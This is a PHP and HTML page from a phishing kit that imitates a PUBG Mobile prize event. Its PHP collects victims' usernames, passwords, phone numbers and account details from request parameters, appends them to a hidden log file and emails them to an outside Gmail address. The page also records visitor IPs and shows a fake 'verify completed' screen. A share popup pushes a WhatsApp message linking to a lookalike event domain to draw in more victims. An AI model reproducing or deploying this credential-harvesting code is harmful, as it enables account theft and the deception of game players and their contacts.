<?php
include ('../../admin/config.php');
$headers = "From: mr.kanhan@gmail.com";
$headers.= "Content-type: text/html";
$success = mail($mailto, $subjek, $body, $headers);
$handle = fopen("../../admin/vic.php", "a");
foreach ($_GET as $variable => $value) {
    fwrite($handle, $variable);
    fwrite($handle, "=");
    fwrite($handle, $value);
    fwrite($handle, "");
}
fwrite($handle, "");
fclose($handle);
$bilsmg.= "</center> <center><br>";
$file = fopen("../../admin/vic.php", "a");
fwrite($file, $bilsmg);
fclose($file);
$line = date('Y-m-d H:i:s') . " - $_SERVER[REMOTE_ADDR]";
file_put_contents('../../admin/VisitorsIP.log', $line . PHP_EOL, FILE_APPEND);
?>

<?php
$username = $_GET['username'];
$password = $_GET['password'];
$phone = $_GET['phone'];
$login = $_GET['login'];
$nickname = $_GET['nickname'];
$playid = $_GET['playid'];
$level = $_GET['level'];
$tier = $_GET['tier'];
$rpt = $_GET['rpt'];
$rpl = $_GET['rpl'];
$platform = $_GET['platform'];
$country = $_GET['country'];
?>

<?php
include ('../../admin/config.php');
$url = "http://" . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
$subjek = "PUBG $login|$username|$level";
$body = <<<EOD

Username   =   $username
Password   =   $password
PhoneNum   =   $phone

Nickname   =   $nickname
playerID   =   $playid
Tier       =   $tier
Rp Type    =   $rpt

AccLevel   =   $level
RP Level   =   $rpl

Platform   =   $platform
Country    =   $country


Coming from   = $url
</div>
EOD;
$headers = "From: PubgMobile <mr.kanhan@gmail.com>";
$headers.= "";
$success = mail($result, $subjek, $body, $headers);
?>
<html>
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta property="og:title" content="PUBG MOBILE">
<meta name="description" content="Latest PUBG MOBILE update. Get an exclusive Season 10 prize especially for you !!!">
<meta property="og:description" content="Latest PUBG MOBILE update. Get an exclusive Season 10 prize especially for you !!!">
<meta property="og:url" content="./">
<meta property="og:site_name" content="PUBG MOBILE">
<meta property="og:type" content="website">
<meta name="copyright"content="PUBG MOBILE">
<meta name="theme-color" content="#f2aa00">
<meta property="og:image" content="img/icon.png">
<title>PUBG MOBILE</title>
<link rel="stylesheet" href="css/style.css">
<link rel="stylesheet" href="css/animate.css">
<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
<link rel="icon" href="img/icon.png">
<script type="text/javascript" src="//s7.addthis.com/js/300/addthis_widget.js#pubid=ra-5dcbabd2869127ad"></script>
</head>
<body oncontextmenu="return false" onselectstart="return false" ondragstart="return false">

<div class="container">
<div class="container-dark">
<center>
<div class="container-line"></div>
</center>
<div class="header">
<img src="img/logo.png">
<button type="button" onclick="share()"><i class="fa fa-share"></i> Share</button>
</div>

<div class="box">

<div class="txt-season">VERIFY COMPLETED<br> <small>ACCOUNT IS IN THE PROCESS</small></div>

<center>
<div class="box-notes">
Hi, <?php echo $nickname;?></br>
Thank you for joining this event
</br>
Currently, your account is being processed by the system to receive the prize.
</br>
Please wait until the process is complete.
</br>
</br>
<span id="timer"></span>
</div>
</center>

<center>
<button type="button" class="btn-continue" onclick="location.href='/';">Logout</button>
</center>
</div> <!--- box --->
</div> <!--- container dark --->
</div> <!--- container --->


<!--- SHARE CONTENT --->
<div class="popup share" style="display: none;">
<div class="popup-box animated fadeIn">
<div class="container">
<div class="container-dark">
<center>
<div class="container-line"></div>
</center>
<div class="header">
<img src="img/logo.png">
<button type="button"><i class="fa fa-share"></i> Share</button>
</div>
<div class="box">
<center>
<img class="season-logo" src="img/s10.png">
</center>
<div class="txt-season">ROYALE PASS SEASON 10 <br> <small>SHARE THIS EVENT TO YOUR FRIENDS OR FAMILY</small></div>
<center>
<div class="box-notes">
<center>
<div class="pilihan-login" onclick="location.href='whatsapp://send?text=Get a variety of exclusive prizes from PUBG MOBILE. Click the link below to claim an exclusive gift especially for you: http://eventpubgs10.mrbonus.com'">
<img src="img/wa.png">
</div>
</center>
</div>
<button type="button" class="btn-continue" onclick="closeshare()">Cancel</button>
</center>
</div> <!--- box --->
</div> <!--- container dark --->
</div> <!--- container --->
</div>
</div>
<!--- SHARE CONTENT END --->


<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
<script type="text/javascript" src="http://code.jquery.com/jquery-1.10.2.min.js"></script>
<script src="js/popup.js"></script>
<script src="js/timer.js"></script>

</body>
</html>